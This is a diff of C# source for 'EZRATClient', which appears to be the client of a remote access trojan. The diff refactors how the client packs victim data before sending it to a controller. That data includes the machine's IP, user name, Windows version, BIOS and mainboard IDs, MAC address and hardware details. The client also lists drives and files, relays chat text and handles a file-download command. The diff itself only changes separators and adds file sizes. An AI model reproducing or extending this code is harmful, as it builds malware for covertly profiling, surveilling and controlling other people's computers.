@@ -10,6 +10,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using EZRATClient.Utils;
 
 
 namespace EZRATClient
@@ -29,14 +30,14 @@ namespace EZRATClient
                 response += text.Substring(8);
                 response += ";";
                 response += SystemInfo.GetLocalIPAddress();
-                response += "¦";
+                response += Constantes.Separator;
                 response += SystemInfo.GetMachineName();
-                response += "¦";
+                response += Constantes.Separator;
                 response += SystemInfo.GetUserName();
-                response += "¦";
+                response += Constantes.Separator;
                 response += SystemInfo.GetWindowsVersion();
-                response += "¦";
-                response += Program._version;
+                response += Constantes.Separator;
+                response += Constantes.Version;
 
                 Program.SendCommand(response);
 
@@ -49,7 +50,7 @@ namespace EZRATClient
                 for (int i = 0; i < drives.Length; i += 1)
                 {
                     response += drives[i];
-                    response += "¦";
+                    response += Constantes.Separator;
                 }
 
                 Program.SendCommand(response);
@@ -81,16 +82,18 @@ namespace EZRATClient
                 resD.ForEach((item) =>
                 {
                     response += item.Name; // Tarte.cs
-                    response += "¦";  // Tarte.cs¦
+                    response += Constantes.Special_Separator;  // Tarte.cs¦
                     response += "2";  // Tarte.cs¦2
-                    response += "|";  // Tarte.cs¦2|
+                    response += Constantes.Separator;  // Tarte.cs¦2|
                 });
                 resF.ForEach((item) =>
                 {
                     response += item.Name; // Tarte.cs
-                    response += "¦";  // Tarte.cs¦
+                    response += Constantes.Special_Separator;  // Tarte.cs¦
                     response += "1";  // Tarte.cs¦1
-                    response += "|";  // Tarte.cs¦1|
+                    response += Constantes.Special_Separator;  // Tarte.cs¦
+                    response += item.Length.ToString();  // Tarte.cs¦1¦3732527|
+                    response += Constantes.Separator;  // Tarte.cs¦1|
                 });
 
                 Program.SendCommand(response);
@@ -117,7 +120,7 @@ namespace EZRATClient
             {
                 if (cht != null)
                 {
-                    Program.SendCommand("chatdata;" + String.Join("¦", cht.Texted));
+                    Program.SendCommand("chatdata;" + String.Join(Constantes.Separator, cht.Texted));
                 }
             }
             else if (text.StartsWith("dlfile;"))
@@ -194,17 +197,17 @@ namespace EZRATClient
             {
                 string result = "sysinfo;";
                 result += SystemInfoDetails.GetBiosIdentifier();
-                result += "¦";
+                result += Constantes.Separator;
                 result += SystemInfoDetails.GetCpuName();
-                result += "¦";
+                result += Constantes.Separator;
                 result += SystemInfoDetails.GetGpuName();
-                result += "¦";
+                result += Constantes.Separator;
                 result += SystemInfoDetails.GetLanIp();
-                result += "¦";
+                result += Constantes.Separator;
                 result += SystemInfoDetails.GetMacAddress();
-                result += "¦";
+                result += Constantes.Separator;
                 result += SystemInfoDetails.GetMainboardIdentifier();
-                result += "¦";
+                result += Constantes.Separator;
                 result += SystemInfoDetails.GetTotalRamAmount();
                 Program.SendCommand(result);
             }
